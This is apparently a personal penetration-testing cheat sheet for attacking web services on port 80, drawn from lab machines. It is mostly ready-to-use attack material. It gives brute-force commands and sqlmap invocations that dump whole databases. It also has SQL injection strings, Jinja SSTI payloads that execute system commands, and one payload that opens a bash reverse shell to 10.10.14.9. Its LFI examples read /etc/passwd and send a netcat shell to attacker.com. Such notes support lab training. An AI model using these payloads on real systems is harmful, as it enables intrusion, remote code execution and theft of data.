---
title: Port 80 - HTTP
draft: false
tags:
  - http
  - directory-bruteforce
  - wappalyzer
  - subdomain-bruteforce
  - lfi
  - sqli
---
## Directory Bruteforce

Perform directory bruteforce as such:

`sudo feroxbuster -u http://10.10.10.84 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

![](https://i.imgur.com/lzQ8C4L.png)


Check what extensions webpage is using by accessing such file as **index.php** or **index.html**.

Set appropriate extension with **-x** flag.

When on Windows machine -> Use lower case directory list.

When on IIS machine -> Use IIS specific wordlist.

## Subdomain Bruteforce

Perform Subdomain bruteforcing and add newly discovered subdomains to **/etc/hosts**:

`gobuster vhost -u http://analytical.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster-vhost`


## SQLi

### SQLmap

`sqlmap -r admin-cronos-htb-login-req.txt --batch`

![](https://i.imgur.com/cZPXbyU.png)

I can dump the whol database:

`sqlmap -r req.txt --dbs --batch --dump`

![](https://i.imgur.com/b5os4DF.png)

Instead of dumping the entire database, I can also specify the dump using the commands below:

`sqlmap -r req.txt -D main --tables --batch`

![](https://i.imgur.com/j02GNFt.png)


`sqlmap -r req.txt --dbs --batch -D main -t user --dump`


![](https://i.imgur.com/EmCUyEV.png)


### Manual Testing

Example:

```sql
' or 1=1-- -
OR 1=1;-- -
```

## SSTI

Follow [this list of payloads](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt) to attempt on advanced SSTI.

try injecting alert script and see if the web app is actually reading the script:

![](https://i.imgur.com/jIF0Q5e.png)


Now on the browser, it confirms SSTI vulnerability.

![](https://i.imgur.com/eXv2drC.png)



Trying with `{{7*7}} = {{7*7}}` shows **49=49**:

![](https://i.imgur.com/V5lo0o3.png)


Using the command below, I can execute command `id`:

```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

![](https://i.imgur.com/P3Nmx7H.png)



Using the command below I can list files in current directory:

```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

![](https://i.imgur.com/9FgzGBT.png)


Using the command below, I can spawn a reverse shell as **root**:

```bash
{{config.__class__.__init__.__globals__['os'].popen('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.9/1337 0>&1"').read()}}
```

![](https://i.imgur.com/zXdSn9l.png)


## LFI

`http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd`

![](https://i.imgur.com/0bnt99B.png)

### Examples

```
http://example.com/index.php?page=/etc/passwd&cmd=id
http://example.com/index.php?page=/var/log/apache/access.log&cmd=nc%20-e%20/bin/bash%20attacker.com%204444
http://example.com/index.php?page=php://input&cmd=cat%20/etc/passwd
```
